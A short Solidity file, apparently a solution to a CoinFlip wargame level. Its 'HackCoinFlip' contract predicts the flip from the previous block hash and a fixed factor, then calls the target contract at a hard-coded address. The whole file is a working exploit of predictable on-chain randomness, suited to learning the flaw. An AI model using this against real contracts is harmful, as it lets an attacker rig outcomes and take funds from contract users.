// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "@openzeppelin/contracts/utils/math/SafeMath.sol";

contract CoinFlip {
  uint256 public consecutiveWins;
  function flip(bool _guess) public returns (bool) {}
}


contract HackCoinFlip {

  using SafeMath for uint256;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
  CoinFlip coinFlipContract = CoinFlip(0xfAac2398c6150c27392b6f5D46a53726751a3aA1);

  constructor() {
  }

  function flip() public returns (uint256) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;
    
    coinFlipContract.flip(side);

    return coinFlipContract.consecutiveWins();
  }
}